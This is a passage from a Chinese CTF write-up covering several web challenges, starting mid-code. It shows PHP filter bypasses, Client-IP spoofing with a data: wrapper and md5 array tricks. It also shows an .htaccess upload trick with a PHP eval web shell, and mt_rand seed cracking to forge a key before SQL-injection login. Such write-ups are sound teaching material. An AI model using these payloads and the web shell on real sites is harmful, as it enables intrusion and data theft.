Show($a);//将字符串打印出来</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure>

<p>然后得到的是一串base64，解码即可得到flag。</p>
<h3 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a><strong>套娃</strong></h3><p>F12查看到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$query = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span>( substr_count($query, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">      die(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">   <span class="keyword">if</span>($_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; preg_match(<span class="string">&#x27;/^23333$/&#x27;</span>, $_GET[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">      echo <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>首先是对字符串的下划线进行统计，如果大于0就直接die()</p>
<p>但是下面需要接收一个包含下划线的参数b_u_p_t，而且它不能等于23333而正则匹配却要有23333。这里直接用%0a可以绕过。而php参数，空格和点都会变成下划线_。</p>
<p><strong>payload</strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">http://ecf196f2-c27e-427a-aecc-31e4ee6a3a28.merak-ctf.site/?b.u.p.t=23333%0a</span><br></pre></td></tr></table></figure>

<p>得到secrettw.php文件名。</p>
<p>右键看源码存在一个jsfuck，直接丢谷歌浏览器解码得 <code>post me Merak</code>。</p>
<p>post提交Merak得源码</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"> error_reporting(<span class="number">0</span>); </span><br><span class="line"> include <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"> ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"> include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"> <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">     highlight_file(__FILE__); </span><br><span class="line">     die(); </span><br><span class="line"> &#125; </span><br><span class="line"> function change($v)&#123; </span><br><span class="line">     $v = base64_decode($v); </span><br><span class="line">     $re = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">     <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">         $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">     &#125; </span><br><span class="line">     <span class="keyword">return</span> $re; </span><br><span class="line"> &#125;</span><br><span class="line"> echo <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"> $ip = getIp();</span><br><span class="line"> <span class="keyword">if</span>($ip!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"> echo <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.$ip;</span><br><span class="line"> <span class="keyword">if</span>($ip === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; file_get_contents($_GET[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"> echo <span class="string">&quot;Your REQUEST is:&quot;</span>.change($_GET[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"> echo file_get_contents(change($_GET[<span class="string">&#x27;file&#x27;</span>])); &#125;</span><br><span class="line"> ?&gt;  </span><br></pre></td></tr></table></figure>

<p>绕过IP的方法<code>Client-IP: 127.0.0.1</code>，使用data协议去绕过<code>file_get_contents</code>。</p>
<p>逆向change函数</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function dechange($v)&#123;</span><br><span class="line">    $re = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo dechange(<span class="string">&#x27;todat is a happy day&#x27;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>exp</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">GET /secrettw.php?2333=data:text/html;base64,dG9kYXQgaXMgYSBoYXBweSBkYXk=&amp;file=ZmpdYSZmXGI= HTTP/1.1</span><br><span class="line">Host: <span class="number">17409</span>a10<span class="number">-8159</span><span class="number">-4621</span>-ac69<span class="number">-576</span>be7b7bd12.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">76.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">76.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Client-IP: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure>

<h3 id="PYwebsite"><a href="#PYwebsite" class="headerlink" title="PYwebsite"></a>PYwebsite</h3><p>XFF绕过</p>
<h3 id="ez-bypass"><a href="#ez-bypass" class="headerlink" title="ez_bypass"></a>ez_bypass</h3><p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">include <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line">$flag=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;isset($_GET[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    $id=$_GET[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    $gg=$_GET[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (md5($id) === md5($gg) &amp;&amp; $id !== $gg) &#123;</span><br><span class="line">        echo <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            $passwd=$_POST[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!is_numeric($passwd))</span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>($passwd==<span class="number">1234567</span>)</span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     die(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     echo <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                echo <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        echo <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">&#x27;Please input first&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;Please input first</span><br></pre></td></tr></table></figure>

<p>第一层的md5用数组绕过，<code>?gg[]=1&amp;id[]=2</code>，第二层passwd是1234567a。</p>
<h3 id="你传你🐎呢"><a href="#你传你🐎呢" class="headerlink" title="你传你🐎呢"></a>你传你🐎呢</h3><p>改<code>Content-Type: image/png</code>，然后传个<code>.hatccess</code>，内容为：</p>
<p>SetHandler application/x-httpd-php</p>
<p>再传个图片马过去<code>1.jpg</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;cmd&#39;]) ?&gt;</span><br></pre></td></tr></table></figure>

<p>蚁剑连接即可</p>
<h3 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h3><p>使用dirsearch</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cd Documents/dirsearch</span><br><span class="line"></span><br><span class="line">python3 dirsearch.py -u <span class="string">&quot;url&quot;</span> -e *</span><br></pre></td></tr></table></figure>

<p>扫目录扫到<a href="http://www.zip/">www.zip</a></p>
<p>源码</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(isset($_POST[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $password = $_POST[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">&#x27;Private_key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">&#x27;&#x27;</span>) || ($password == <span class="string">&#x27;&#x27;</span>) ||($Private_key == <span class="string">&#x27;&#x27;</span>)) &#123;</span><br><span class="line">        // 若为空,视为未填写,提示错误,并<span class="number">3</span>秒后返回登录界面</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        echo <span class="string">&quot;用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">&#x27;*************&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2; url=login.html&#x27;</span>);</span><br><span class="line">        echo <span class="string">&quot;假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!&quot;</span>;</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">&#x27;************&#x27;</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">&quot;SELECT flag FROM user WHERE username= &#x27;crispr&#x27; AND password = &#x27;$password&#x27;&quot;</span>.<span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">        $link=mysql_connect(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line">        mysql_select_db(<span class="string">&quot;test&quot;</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            echo <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;username&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>.$row[<span class="string">&quot;flag&quot;</span>].<span class="string">&quot;&lt;/td&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">// genarate public_key</span><br><span class="line">function public_key($length = <span class="number">16</span>) &#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  //genarate private_key</span><br><span class="line">  function private_key($length = <span class="number">12</span>) &#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  //$Public_key = KVQP0LdJKRaV3n9D  how to get crisp<span class="string">r&#x27;s private_key???</span></span><br></pre></td></tr></table></figure>

<p>随机数种子问题，用脚本将公钥整理成php_mt_rand的格式，脚本如下:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]]</span><br><span class="line">$str = <span class="string">&quot;KVQP0LdJKRaV3n9D&quot;</span>;</span><br><span class="line">$randStr = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++)&#123;</span><br><span class="line">$pos = strpos($randStr,$str[$i]);</span><br><span class="line">echo $pos.<span class="string">&quot; &quot;</span>.$pos.<span class="string">&quot; &quot;</span>.<span class="string">&quot;0 &quot;</span>.(strlen($randStr)<span class="number">-1</span>).<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">42</span> <span class="number">42</span> <span class="number">0</span> <span class="number">61</span> <span class="number">41</span> <span class="number">41</span> <span class="number">0</span> <span class="number">61</span> <span class="number">52</span> <span class="number">52</span> <span class="number">0</span> <span class="number">61</span> <span class="number">37</span> <span class="number">37</span> <span class="number">0</span> <span class="number">61</span> <span class="number">3</span> <span class="number">3</span> <span class="number">0</span> <span class="number">61</span> <span class="number">35</span> <span class="number">35</span> <span class="number">0</span> <span class="number">61</span> <span class="number">36</span> <span class="number">36</span> <span class="number">0</span> <span class="number">61</span> <span class="number">43</span> <span class="number">43</span> <span class="number">0</span> <span class="number">61</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">61</span> <span class="number">47</span> <span class="number">47</span> <span class="number">0</span> <span class="number">61</span> <span class="number">55</span> <span class="number">55</span> <span class="number">0</span> <span class="number">61</span> <span class="number">13</span> <span class="number">13</span> <span class="number">0</span> <span class="number">61</span> <span class="number">61</span> <span class="number">61</span> <span class="number">0</span> <span class="number">61</span> <span class="number">29</span> <span class="number">29</span> <span class="number">0</span> <span class="number">61</span></span><br></pre></td></tr></table></figure>

<p>还原成种子为：1775196155</p>
<p>接下来还原密钥即可</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line">function public_key($length = <span class="number">16</span>) &#123;</span><br><span class="line">    $strings1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $public_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    &#123;</span><br><span class="line">        echo mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>).<span class="string">&quot;---&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   function private_key($length = <span class="number">12</span>) &#123;</span><br><span class="line">    $strings2 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    $private_key = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">echo public_key();</span><br><span class="line">echo private_key();</span><br></pre></td></tr></table></figure>

<p>然后进login.html</p>
<p>输入万能密码和密钥和用户名crispr即可。</p>
]]></content>
      <categories>
        <category>CTF比赛</category>
      </categories>
  </entry>
</search>
